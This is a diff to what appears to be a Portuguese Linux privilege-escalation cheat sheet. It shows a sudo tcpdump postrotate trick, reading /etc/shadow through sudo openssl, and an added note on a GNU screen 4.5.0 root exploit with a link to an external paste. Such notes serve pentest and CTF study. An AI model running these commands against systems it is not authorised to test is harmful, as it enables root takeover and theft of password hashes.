@@ -209,6 +209,12 @@ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.arquivo_com
 # Caso o bin /usr/bin/openssl seja (root) NOPASSWD para ler arquivos com permissões root
 sudo /usr/bin/openssl enc -in /etc/shadow
 
+# Vulnerabilidade de escalação de privilégios no serviço screen versão 4.5.0
+screen -v
+Screen version 4.05.00 (GNU) 10-Dec-16
+exploit para vuln se encontra aqui: https://dontpad.com/83hf72%C3%A7@3
+
+
 # Ferramentas automatizadas de enumeração
 linpeas.sh
 linenum.sh
